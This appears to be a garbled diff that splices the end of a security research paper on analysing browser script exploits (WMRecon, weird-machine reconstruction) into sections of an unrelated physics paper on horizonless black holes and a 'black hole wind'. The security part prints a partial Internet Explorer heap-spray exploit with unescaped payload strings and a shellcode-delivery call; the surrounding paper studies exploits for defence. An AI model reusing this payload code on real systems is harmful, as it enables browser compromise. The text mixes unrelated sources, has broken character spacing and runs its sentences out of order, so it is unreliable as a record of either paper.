-33 C o l l e c t G a r b a g e ( ) ;
-34
-35 s etM a r k e r ( ’ p r e p a r e ’ ) ;
-36 / / p r e p a r e : : memalloc +memfree+memfree+memalloc . . . SNIP . . .
-37 / / [ I n f o : 6KB+6KB+12KB+25KB]
-38 p = u n e s c a p e (”% u5770%u466b ” ) ;
-39 f o r ( i = 0; i < 3 ; i ++ ) {
-40 p += u n e s c a p e (”% u5770%u466b ” ) ;
-41 }
-42 p += u n e s c a p e (”% ub860 . . . SNIP . . . ” ) ;
-43
-44 f o = u n e s c a p e (”% ud801%u77c4 ” ) ;
-45 f o r ( i = 0; i < 5 5; i ++ ) {
-46 i f ( i == 5 4 ) { f o += u n e s c a p e (”% u5ed5%u77c1 ” ) ; }
-47 e l s e { f o += u n e s c a p e (”% ud801%u77c4 ” ) ; }
-48 }
-49
-50 f o += p ;
-51
-52 s etM a r k e r ( ’ mstime ’ ) ;
-53 / / mstime : : memalloc +memfree . . . SNIP . . . \ \
-54 + c a l l S t a c k R e p l a c e + . . . SNIP . . . + e x e c C r a f t e d
-55 / / [ I n f o : 118KB+118KB . . . SNIP . . . \ \
-56 +0 x 0 4 6ae 0 4c + . . . SNIP . . . + 0 x 0 4 6ae 1a d ]
-57 m stim e m all o c ({ s h e l l c o d e : fo , h e a pBl o c k Si z e : 0 x58 ,\\
-58 o b j I d : ” myanim ” } ) ;
-59 }
-60 </ s c r i p t >
-61 </head>
-62
-63 <body o nl o a d =” e v a l ( h ell oW o rl d ( ) )” >
-64 <t :ANIMATECOLOR i d =”myanim”/>
-65 <di v i d =” di v elm”></di v>
-66 <fo rm i d =” fo rmelm”>
-67 </form>
-68 </body>
-69 </ html>
-V. DISCUSSION AND RESEARCH DIRECTION
-Results obtained from the case studies demonstrate promise
-for the feasibility of approaching exploit analysis through WM
-reconstruction. In particular the 4 primitives, along with the
-process followed for defining them, show how exploit primitives can be defined in the manner required by the WMRecon
-algorithm. Despite the case studies being based on relatively
-less recent exploits and targets, mandated by the elevated
-sophistication of the more recent ones, they nonetheless attain
-their intent of demonstrating the end-to-end applicability of the
-idea being proposed and therefore augur favourably towards
-further exploration in this direction. Definitely, one important
-outcome is the crucial requirement that tools implementing
-WMRecon should be able to accurately detect and monitor
-custom application-level memory managers. Substantial effort
-has already been devoted towards this endeavour in previous
-work with significant success [16], and therefore a solid
-starting point is already in place.
-Only once this aspect has been dealt with can research
-proceed to cover more sophisticated/recent exploits as case
-studies. In particular, we are after exploits that leverage multiple features and vulnerabilities from their targets, possibly
-combining different parsing modules and script engines of the
-same web browser within individual steps of the same exploit.
-One specific example5
-leverages an ActionScript engine’s
-5https://blog.fortinet.com/2014/05/27/a-technical-analysis-of-cve-2014-
-1776
-deterministic memory layout combined with a JavaScriptaccessible browser vulnerability to be able to bypass ASLRrandomized heaps by leaking memory content. A separate
-memory error in the ActionScript engine is then used to subvert execution, switching off DEP using ROP in the process.
-Reconstructing WMs from exploits having a similar level of
-sophistication entails defining further exploit primitives, e.g.
-attacker-controlled memory reads, as well as being able to
-separate the program memory state transitions of different
-application threads during dynamic binary analysis.
-In the longer term the followed up idea should also cater for:
-assisting analysts during the marker placement process; script
-de-obfuscation specifically targeted for aiding exploit analysis;
-non-web browser script exploit case studies; as well as kernel
-exploit case studies. With respect to the latter research avenue
-it is interesting to note that kernel exploits are similar to
-script exploits, in the sense that, while script exploits utilize
-primitives to access native-level operations from the scriptlevel, likewise kernel exploits access kernel-level operations
-from user-level.
-VI. CONCLUSIONS
-In this paper we tackled the problem of the ever-increasing
-difficulty of analysing script exploits due to their increased
-sophistication. The approach taken was to cast the exploit
-analysis problem as a Weird Machine (WM) reconstruction
-problem, that aims to identify those script statements being
-used as exploit primitives in order to take advantage of
-emergent functionality inside target applications constituting
-a WM, and of which they are valid bytecode. This novel idea
-As explained at length in this paper, analysis of script
-exploits has nothing to do with the superficial semantics of
-script statements, rather it has all to do with the program
-memory-level (native) operations that they aim to attain in
-their quest to program the WM. In-line with this concept,
-we presented WMRecon, a WM reconstruction algorithm that
-takes a dynamic binary analysis approach in order to detect
-behaviour caused by exploit primitives and associating it with
-the responsible script statements. These constitute valid WM
-bytecode while the associated exploit primitive behaviours
-provide the corresponding semantics. The reconstructed WM
-is none other than this identified bytecode set. Experimentation
-with exploit samples of moderate sophistication demonstrates
-the feasibility of this approach. At the same time results
-also point towards the crucial requirement of enhancing the
-current prototype with the capability to detect and monitor
-customer memory managers, before it can handle exploits
-with an elevated level of sophistication. In particular we are
-aiming for exploits that combine multiple script languages and
-eventually to also consider adding kernel exploits within scope.
-proposes that exploit analysts can benefit from the automated
-identification of individual exploit steps while only being
-required to be knowledgeable of exploit programming in
-general. Therefore, they can do away with having to learn
-the in-depth details of a multitude of web browser and script
-engine implementations.
-REFERENCES
-[1] Marco Cova, Christopher Kruegel, and Giovanni Vigna. Detection and
-analysis of drive-by-download attacks and malicious javascript code. In
-Proceedings of the 19th international conference on World Wide Web,
-pages 281–290. ACM, 2010.
-[2] Corelan. Heap spraying demystified. https://www.corelan.be/index.php/
-articles/ [Accessed: 03/04/2017].
-[3] Sergey Bratus, Michael E Locasto, Meredith L Patterson, Len Sassaman,
-and Anna Shubina. Exploit programming: From buffer overflows to
-weird machines and theory of computation. USENIX; login, 36(6), 2011.
-[4] MS IE security vulnerabilities. https://www.cvedetails.
-com/vulnerability-list/vendor id-26/ product id-9900/
-Microsoft-Internet-Explorer.html [Accessed: 03/05/2017].
-[5] Len Sassaman, Meredith L Patterson, and Sergey Bratus. A patch for
-postel’s robustness principle. IEEE Security & Privacy, 10(2):87–91,
-2012.
-[6] Julian Bangert, Sergey Bratus, Rebecca Shapiro, and Sean W Smith.
-The page-fault weird machine: Lessons in instruction-less computation.
-In WOOT, 2013.
-[7] Windows 10 mitigation improvements. https://www.blackhat.com/ docs/
-us-16/materials/ us-16-Weston-Windows-10-Mitigation-Improvements.
-pdf [Accessed: 03/04/2017].
-[8] Trend Micro. A look into Adobe Flash Player CVE-2016-1019 zero-day
-attack. http:// blog.trendmicro.com/trendlabs-security-intelligence/
-look-adobe-flash-player-cve-2016-1019-zero-day-vulnerability/
-[Accessed: 03/04/2017].
-[9] Andreas Moser, Christopher Kruegel, and Engin Kirda. Exploring
-multiple execution paths for malware analysis. In Security and Privacy,
-2007. SP’07. IEEE Symposium on, pages 231–245. IEEE, 2007.
-[10] Dawn Song, David Brumley, Heng Yin, Juan Caballero, Ivan
-Jager, Min Gyung Kang, Zhenkai Liang, James Newsome, Pongsin
-Poosankam, and Prateek Saxena. BitBlaze: A new approach to computer
-security via binary analysis. In International Conference on Information
-Systems Security, pages 1–25. Springer, 2008.
-[11] Sang Kil Cha, Thanassis Avgerinos, Alexandre Rebert, and David
-Brumley. Unleashing Mayhem on binary code. In Security and Privacy
-(SP), 2012 IEEE Symposium on, pages 380–394. IEEE, 2012.
-[12] Yanzhen Qu and Kelly Hughes. Detecting metamorphic malware
-by using behavior-based aggregated signature. In Internet Security
-(WorldCIS), 2013 World Congress on, pages 13–18. IEEE, 2013.
-[13] Xunchao Hu, Aravind Prakash, Jinghan Wang, Rundong Zhou, Yao
-Cheng, and Heng Yin. Semantics-preserving dissection of javascript
-exploits via dynamic js-binary analysis. In International Symposium on
-Research in Attacks, Intrusions, and Defenses, pages 254–276. Springer,
-2016.
-[14] Fermin Serna. The info leak era on software exploitation.
-https://media.blackhat.com/ bh-us-12/Briefings/ Serna/BH US 12
-Serna Leak Era Slides.pdf [Accessed: 03/04/2017].
-[15] Stephen Bradshaw. Heap spray exploit tutorial: Internet Explorer Use
-After Free Aurora vulnerability. http://www.thegreycorner.com/ 2010/
-01/ heap-spray-exploit-tutorial-internet.html[Accessed:03/ 04/ 2017].
-[16] Xi Chen, Asia Slowinska, and Herbert Bos. MemBrush: A practical
-tool to detect custom memory allocators in C binaries. In Reverse
-Engineering (WCRE), 2013 20th Working Conference on, pages 477–
-478. IEEE, 2013.
+VIII. IMPLICATIONS FOR BLACK HOLES
+A. Is there an event horizon?
+We turn finally to the implications of the action of Eq. (10) for black holes. We have already
+noted that a perturbation expansion in powers of Λ shows that for the spherically symmetric
+Schwarzschild-like case studied in Ref. [2], the black hole metric is modified only in a thin shell
+very close to the nominal horizon. We turn now to analytic and numerical results obtained in Ref.
+[2], which show that the g
+−2
+00 factor in Eq. (10) prevents an event horizon from forming.
+Heuristically, an event horizon forms when g00 vanishes, so that outgoing light is infinitely
+redshifted and cannot escape to give an observable wave at infinity. Similarly, for massive particles
+the locally measured energy is governed by the equation Elocal = constant/|g00|
+1/2
+,[29] so a particle
+climbing out from a horizon has its energy infinitely red shifted, and cannot escape to infinity.
+Having a g
+−2
+00 factor in the action, which would become infinite at g00 = 0, changes the equations
+governing black hole structure so as to prevent the vanishing of g00, which leads to absence of an
+event horizon, and as we shall see later, also absence of an apparent horizon. When there is no
+horizon, radiation and matter inside the hole are no longer prevented from climbing out to infinity
+by an effectively infinite gravitational potential well, leading to the possibility of a flux of radiation
+and matter emanating from the hole.
+To verify these heuristics, calculations were done in both polar coordinates and isotropic coordinates, with results as follows.
+1. Polar coordinates The static, spherically symmetric line element in polar coordinates is
+given above in Eq. (14). When Eq. (10) is included in the action, the Einstein equations
+for A and B can be combined to give a second-order, noninear differential equation for B.
+To analyze this equation, it is convenient to put it in dimensionless form by scaling out the
+dimensional constant Λ, by defining9
+x =Λ1/2
+r ,
+B(r) =B
+
+x/Λ
+1/2
+
+≡ b(x) .
+(41)
+9 This rescaled radial variable x (from Ref. [2]) is not to be confused with the rescaled proper time variable x of Eq.
+(18) (from Ref. [5])
+18
+We then find that b(x) satisfies the differential equation, with ′ denoting d/dx,
+b
+′′ +
+2
+x
+b
+′ +
+2(xb′ + b)(xb′ + 3b)
+b(b
+2 − x
+2)
+= 0 . (42)
+Analysis of this equation shows that: (i) b cannot vanish, and also cannot become infinite,
+in the interval 0 < x < ∞; (ii) near x = ∞, b behaves as a positive constant times x
+−6
+,
+corresponding to a singularity at a proper radius of order the inverse Hubble constant,
+where the static assumption is expected to break down; (iii) moving in from infinity, there
+is a Schwarzschild-like regime 1 >> x >> Mˆ , where b ≃ 1 − 2M /x ˆ , with Mˆ = Λ1/2M
+the rescaled black hole mass; (iv) moving further inwards, the perturbative corrections to
+b become large, and prevent b from vanishing, so that instead as b
+2 becomes close to x
+2
+in
+size, b develops a branch cut b(x) = x + C(x − a¯)
+1/2
+, and becomes complex for x < a¯; (v)
+below the branch cut |b| becomes infinite as x
+−1 when x → 0, corresponding to the central
+black hole singularity; (vi) the cusp-like branch cut is a coordinate singularity, and does not
+appear in the scalars R (which vanishes identically), RµνRµν, and RµνλσRµνλσ. A sketch
+of the behavior (i)–(vi) is given in Fig. 1 of Ref. [2], followed by plots that illustrate these
+features in a numerical calculation for Mˆ = 10−2
+. Thus, there is no event horizon
+where b(x) = B(r) vanishes!
+2. Isotropic coordinates The static, spherically symmetric line element in isotropic coordinates is
+(ds)
+2 =
+B[r]
+2
+A[r]
+2
+(dt)
+2 −
+A[r]
+4
+r
+4
+[(dr)
+2 + r
+2
+dΩ
+2
+] , (43)
+where the use of square brackets is a reminder that A, B are different functions of a different
+radial variable than in the polar coordinate case. When Eq. (10) is included in the action,
+the Einstein equations yield a system of coupled second order differential equations for A
+and B,
+A
+′′ =
+3
+4
+Λ
+A9
+r
+4B4
+,
+B
+′′ = −
+9
+4
+Λ
+A8
+r
+4B3
+.
+(44)
+In Ref. [2] these equations were developed in a perturbation expansion around the standard
+isotropic Schwarzschild solution A[r] = r + M/2 , B[r] = r − M/2, with results analogous
+to those found using polar coordinates. Additionally, rescaling A, B, r and M by a factor
+19
+Λ
+1/2
+, the equations of Eq. (44) were integrated numerically by using the Mathematica
+integrator, showing small r and large r singularities corresponding to those found in polar
+coordinates. The numerical solution is smooth in between the two singularities, with g00
+real and nonvanishing, in agreement with the polar coordinate results that there is no event
+horizon, and that the cusp found in polar coordinates is a coordinate singularity, not a
+physical singularity.
+B. Is there an apparent horizon?
+An event horizon is a property of the global causal structure of spacetime, which is not accessible
+in approximate numerical calculations. So in computational general relativity one employs the
+concept of the apparent horizon, defined as the outermost marginally trapped surface.[30],[31]–[36]
+To see if a compact, orientable 2-surface embedded in 4-space is an apparent horizon, one picks two
+orthogonal directions corresponding to outgoing and ingoing null rays, with respective tangents ℓ
+ν
+and n
+ν
+, where ℓ
+2 = n
+2 = 0. Using the (−, +, +, +) metric convention, let us fix the inner product
+of the null rays by adopting the convenient normalization convention,[34]
+ℓ
+αnα = −2 . (45)
+This normalization convention is invariant under reciprocal rescalings of ℓ
+ν and n
+ν
+,
+ℓ
+ν → κℓν
+, nν → κ
+−1n
+ν
+, (46)
+with κ = κ(x) a general nonconstant scalar function of the spacetime coordinate x.
+The expansion θℓ (θn) of the bundle of null rays associated with the tangent vector ℓ (n) is a
+measure of the fractional change of the cross sectional area of the bundle as one moves along the
+central ray of the bundle. In Ref. [31] we showed that the expansions θℓ
+, θn transform under Eq.
+(46) by the simple scaling formulas
+θℓ → κθℓ
+, θn → κ
+−1
+θn , θℓθn → θℓθn . (47)
+Thus calculations of the expansions θℓ
+, θn have a covariance group under the transformations of
+Eq. (46), with the product θℓθn an invariant.
+Consider now what happens if we compute the expansions θℓ,n for the same physics viewed from
+different choices of coordinates. In each coordinate system we have to pick null vectors ℓ and n, and
+different ways of doing this that satisfy the norm convention of Eq. (45) will differ by the rescaling
+20
+freedom of Eq. (46). Thus, if we pick the most convenient definitions of ℓ and n in each coordinate
+system, we will in general get different values of the expansions θℓ
+, θn in the various coordinate
+systems, with only the product θℓθn the same in all systems.10 However, this product is a useful
+diagnostic. According to the usual classification reviewed in Refs. [32]–[34], θℓθn < 0 corresponds
+to a normal or untrapped surface; θℓθn > 0 corresponds to a trapped or antitrapped surface; and
+θℓθn = 0 corresponds to a marginal surface, such as the case θℓ = 0, θn > 0 which defines the future
+apparent horizon. Thus an apparent horizon can be located by computing θℓθn in any coordinate
+system, even though the individual values of θℓ and θn may vary from one coordinate system to
+another.
+In Ref. [7] we have applied this method to the Schwarzschild-like black hole, which was computed
+in isotropic coordinates in Ref. [2] and discussed above in Sec. VIII A. We find that the product
+θℓθn ≤ 0 everywhere between the small r and large r singularities, and so there are no trapped
+surfaces where this product is positive. Thus unlike the Schwarzschild black hole, which has an
+apparent horizon coinciding with its event horizon, the Schwarzschild-like black hole has no event
+horizon, no apparent horizon, and no trapped surfaces!11
+C. Are black holes leaky?
+For a Schwarzschild-like black hole with no interior trapped surfaces, we expect there to be a
+leakage of particles from the interior to outside the nominal horizon. We expect this flux even
+without invoking quantum tunneling, and since it would be at the classical level the size could
+be orders of magnitude larger than the quantum mechanical Hawking radiation flux. So we have
+suggested in Ref. [7] that emerging from black holes, as modified by the dark energy action of Eq.
+(10), there will be a “black hole wind” of particles with enough velocity to escape to an astronomical
+distance from the hole. An important issue for the future will be extending the calculation of the
+preceding section to include normal matter that has entered the black hole, but is not permanently
+trapped, and developing the physical concepts needed to calculate the flux of particles emerging
+from the hole.
+If there is a black hole wind, it could have interesting astrophysical consequences. We here note
+three of them.
+10 For an illustration of this in the transformation of a Schwarzschild black hole metric from spherical to Gullstrand–
+Painlev´e coordinates, see Ref. [31].
+11 Hence, Schwarzschild-like black holes arising from the dark energy action of Eq. (10) are a concrete realization of
+the extremely compact objects discussed in Refs. [37],[38].
+21
+• Observations of the central black hole in our galaxy show the presence of young stars in
+its close vicinity. Lu et al. open their article by stating that:[39]–[41] “One of the most
+perplexing problems associated with the supermassive black hole at the center of our Galaxy
+is the origin of young stars in its close vicinity”. Similar clusters of young stars are found
+in the vicinity of supermassive black holes in nearby galaxies.[42]–[45] A black hole wind of
+particles may furnish a mechanism for the origin of such stars, both by providing material for
+their formation, and by providing an outward pressure cushioning nascent stars against the
+gravitational tidal forces of the black hole.12 This idea could be tested in a phenomenological
+way, by postulating parameters for the black hole wind (particle type, velocity, flux) and
+seeing if they can account for young star formation. We are currently pursuing this idea
+with a simple one dimensional model,[47] in which a flux of particles moves upwards along
+the z axis with a velocity v distribution f(v) at an initial value z = z0, in the presence of a
+gravitational potential V (z) = gz. The aim is to see if conditions for star formation can be
+met near the larger value z = z
+∗ where the particle velocity has decreased to near zero.13
+• Another interesting place to look for consequences of a black hole wind is in galaxy formation.
+Nearly all galaxies are believed to have a central black hole. Could this association indicate
+that black holes catalyze galaxy formation?14 For example, if there is a wind of particles
+emerging from the black hole, it could stabilize infalling matter against collapse into the
+hole, leading to distant regions of over-density and star formation. Again, this idea could be
+tested at a phenomenological level, by adding a parameterized black hole wind to simulations
+modeling galaxy formation.
+• The presence of highly collimated jets that emerge from active galactic nuclei, which are
+believed to contain supermassive black holes, is a striking feature that has attracted much
+attention. The prevailing models for the formation of these jets, in particular the BlandfordZnajek mechanism,[51] assume no material (other than the negligible Hawking radiation
+flux) emerges from the horizon of the central black hole. If this assumption is incorrect, and
+there is a black hole wind at the classical physics level, this wind could play a contributory
+12 For other perplexing phenomena observed near the center of our galaxy, that could be indicative of a black hole
+wind, see Ref. [46].
+13 For a related proposal in which an infalling molecular cloud fragments, see Ref. [48]. I wish to thank Kyle Singh
+for bringing this reference to my attention.
+14 For observational evidence suggesting that massive black holes may have seeded galaxy formation, see Refs.
+[49],[50].
+22
+role in the formation of the observed jets. Thus it will be interesting to solve the rotating
+black hole analog of the calculations of Ref. [2], to get the structure of a rapidly rotating
+Kerr-like black hole, to see if there is evidence for preferential emission of a black hole wind
+along the directions of the rotation axis. In Ref. [7] we have set up the equations for solving
+axially symmetric Einstein equations in the presence of the dark energy action of Eq. (10),
+and discussed a residual general coordinate invariance of these equations that may make
+obtaining a numerical solution tricky.
+IX. OPEN PROBLEMS
+We conclude with a short list of suggestions for future work.
+• Our model for the Hubble parameter has a single parameter Φ(0), so two or more observational data points are needed to give a test. Since the evolution function Φ( ˆ x) drops from
+≃ 1.24 at z = 0 to ≃ 1.12 at z ≃ 0.35,15 the model predicts that an accelerated Hubble
+expansion is “late time” in origin. Thus the model can be strongly confronted when there is
+precision data on the Hubble parameter for redshifts in the range 0 ≤ z < 1.
+• It will also be important to see what our model predicts for the so called “σ8 tension” arising
+from comparing CMB predictions for clustering with low-z cluster counts, as has already
+been done for alternative dark energy models in Refs. [52], [53].
+• If black holes have no event horizon, quantum state evolution should be unitary from cosmological distances down to the apparent singularity in the black hole interior, and hence
+there should be no “quantum information paradox”. This deserves a detailed exploration in
+light of the computational results of Ref. [2].
+• If black holes have no apparent horizon and no trapped surfaces, the Penrose and subsequent
+theorems,[54],[55] giving conditions for collapse to black holes and singularities will have to
+be generalized.
+• Again, if there is no apparent horizon, the question of the interior physics of a black hole
+becomes physically relevant, and will have to be studied. This is important for gaining an a
+priori understanding of the postulated “black hole wind”.
+15 Recall that increasing z corresponds to decreasing x, and z = 0 corresponds to x = x0 ≃ 1.169; see Table I of Ref.
+[5].
+23
+• We have focused on a particle flux emanating from the hole, but there may also be an
+electromagnetic radiation flux. This raises the questions, can leaky black holes still appear
+“black”, and how are black hole shadows as observed by the Event Horizon Telescope (see
+Ref. [56]) affected by the “leak”?
+• If there is a “black hole wind”, there may be significant implications for galaxy and star
+formation, which have yet to be explored beyond the simple one dimensional model of Ref.
+[47] currently under study.
+• Although in Ref. [7] we formulated the equations for an axially symmetric rotating “Kerrlike” black hole with dark energy action given by Eq. (10), solving these equations numerically is still an open problem. How does “leakiness” manifest itself when nonzero rotation
+is present, which is the generic case? Will the solution for rapidly rotating black holes have
+consequences of interest for active galactic nucleus jets?
+• The argument we gave for a possible connection between inflation and a scale invariant dark
+energy offers no dynamics for the potential α
+−4
+[τ ] that is postulated to drive inflation, unlike
+the inflaton models that offer a detailed picture. What is the physics driving nonperturbative
+evolution of α[τ ]?16
+• Can a future unification theory explain why explicit Weyl scaling symmetry breaking appears
+in the Einstein-Hilbert action, which is quadratic (and higher) order in metric derivatives,
+but not in the non-derivative dark energy action postulated in Eq. (10)?
+• We have obtained the conserving completion of the space-space components of the dark
+energy stress energy tensor T
+ij in special background geometry cases where only an algebraic
+equation, or an ordinary differential equation, need to be solved. Can one prove that a
+conserving completion can always be constructed for a general background geometry?
+• What does a scale invariant dark energy action say about the astrophysics of so called
+“methuselah stars”, stars with apparent ages very similar to the age of the universe? Is
+there other astrophysics, beyond the ones discussed in this review, that could be altered if
+dark energy is given by the action of Eq. (10)?
+16 We do not now think that the model for a nonperturbative “second equation” given in Sec. IVC of Ref. [5] gives
+a satisfactory answer. In the perturbative limit, the relation Ψ = Φ gives the needed second equation.
+24
